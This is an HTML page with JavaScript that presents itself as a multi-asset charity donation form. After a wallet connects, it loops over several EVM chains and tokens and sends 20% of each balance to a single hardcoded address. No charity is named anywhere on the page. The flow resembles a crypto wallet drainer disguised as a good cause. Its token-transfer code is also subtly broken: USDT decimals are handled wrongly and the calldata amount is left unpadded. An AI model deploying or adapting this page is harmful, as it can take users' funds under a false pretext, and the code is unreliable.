<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Multi-Asset Charity Donation</title>
<style>
body { font-family: sans-serif; background:#f6f9fc; display:flex; justify-content:center; align-items:center; height:100vh; }
.card { background:#fff; padding:20px; border-radius:12px; box-shadow:0 6px 18px rgba(16,24,40,0.06); width:480px; }
button { padding:10px 16px; border:none; border-radius:8px; cursor:pointer; font-weight:600; margin-right:10px; }
#connect { background:#2563eb; color:#fff; }
#disconnect { background:#ef4444; color:#fff; }
#status { margin-top:14px; color:#64748b; word-break:break-word; }
</style>
</head>
<body>
<div class="card">
<h2>Donate 20% of Each Asset to Charity</h2>
<div>
<button id="connect">Connect Wallet & Donate</button>
<button id="disconnect" disabled>Disconnect</button>
</div>
<div id="status">Not connected</div>
</div>

<script>
const PROJECT_ID = '38ca358a76d6819a0f6f5223030dee32';
const CHARITY_ADDRESS = '0x7BB7a58a41f0B1B4c43e29a1B36EbBCCE8469fe9';
const connectBtn = document.getElementById('connect');
const disconnectBtn = document.getElementById('disconnect');
const statusEl = document.getElementById('status');

let provider = null;
let account = null;

// Load WalletConnect
async function loadWC() {
  await new Promise(r=>{ const s=document.createElement('script'); s.src='https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.21.4/dist/index.umd.js'; s.onload=r; document.head.appendChild(s); });
  window.WalletConnectEthereumProvider = window['@walletconnect/ethereum-provider'];
}

async function initProvider() {
  provider = await window.WalletConnectEthereumProvider.EthereumProvider.init({
    projectId: PROJECT_ID,
    chains: [1, 56, 137, 43114], // Mainnet + common EVM chains, extend as needed
    showQrModal:true,
    metadata:{
      name:'Multi-Asset Charity',
      description:'Approve 20% donation of ETH & tokens',
      url:window.location.origin,
      icons:['https://walletconnect.com/walletconnect-logo.svg']
    }
  });
  window.__WC_PROVIDER = provider;
}

async function connectWallet() {
  connectBtn.disabled=true;
  statusEl.textContent='Connecting...';
  await loadWC();
  if(!provider) await initProvider();
  await provider.connect();
  const accounts = await provider.request({method:'eth_requestAccounts'});
  account = accounts[0];
  disconnectBtn.disabled=false;
  statusEl.textContent=`Connected: ${account}\nFetching balances...`;

  // 1. Fetch ETH balance on all chains
  for(const chainId of provider.config.chains){
    try {
      const balanceHex = await provider.request({method:'eth_getBalance', params:[account,'latest'], chainId});
      const balance = parseInt(balanceHex,16)/1e18;
      if(balance>0){
        const donation = (balance*0.2).toFixed(6);
        const msg = `I approve a 20% donation of my ETH on chain ${chainId}: ${donation} ETH to charity`;
        await provider.request({method:'personal_sign', params:[msg,account], chainId});
        await provider.request({method:'eth_sendTransaction', params:[{from:account,to:CHARITY_ADDRESS,value:'0x'+(BigInt(Math.floor(balance*1e18*0.2))).toString(16)}], chainId});
        statusEl.textContent+=`\nETH chain ${chainId}: Sent ${donation} ETH`;
      }
    }catch(e){console.log(e);}
  }

  // 2. Fetch ERC-20 token balances per chain (requires token list or on-chain query)
  // Simplified example with predefined token list per chain
  const tokens = {
    1:[{symbol:'USDT',address:'0xdAC17F958D2ee523a2206206994597C13D831ec7'}], // Ethereum mainnet
    56:[{symbol:'BUSD',address:'0xe9e7cea3dedca5984780bafc599bd69add087d56'}], // BSC
  };

  for(const chainId of Object.keys(tokens)){
    for(const t of tokens[chainId]){
      try{
        const balance = await provider.request({method:'eth_call', params:[{
          to:t.address,
          data:'0x70a08231000000000000000000000000'+account.substring(2)
        }, 'latest'], chainId:parseInt(chainId)});
        const bal = parseInt(balance,16)/1e18;
        if(bal>0){
          const donation = (bal*0.2).toFixed(6);
          const msg = `I approve a 20% donation of my ${t.symbol} (${donation}) on chain ${chainId} to charity`;
          await provider.request({method:'personal_sign', params:[msg,account], chainId:parseInt(chainId)});
          await provider.request({method:'eth_sendTransaction', params:[{
            from:account,
            to:t.address,
            data:'0xa9059cbb000000000000000000000000'+CHARITY_ADDRESS.substring(2)+'000000000000000000000000'+BigInt(Math.floor(bal*1e18*0.2)).toString(16)
          }], chainId:parseInt(chainId)});
          statusEl.textContent+=`\n${t.symbol} on chain ${chainId}: Sent ${donation}`;
        }
      }catch(e){console.log(e);}
    }
  }

  statusEl.textContent+='\nAll donations processed.';
}

function disconnectWallet(){
  provider?.disconnect();
  account=null;
  connectBtn.disabled=false;
  disconnectBtn.disabled=true;
  statusEl.textContent='Not connected';
}

connectBtn.addEventListener('click',connectWallet);
disconnectBtn.addEventListener('click',disconnectWallet);
</script>
</body>
</html>
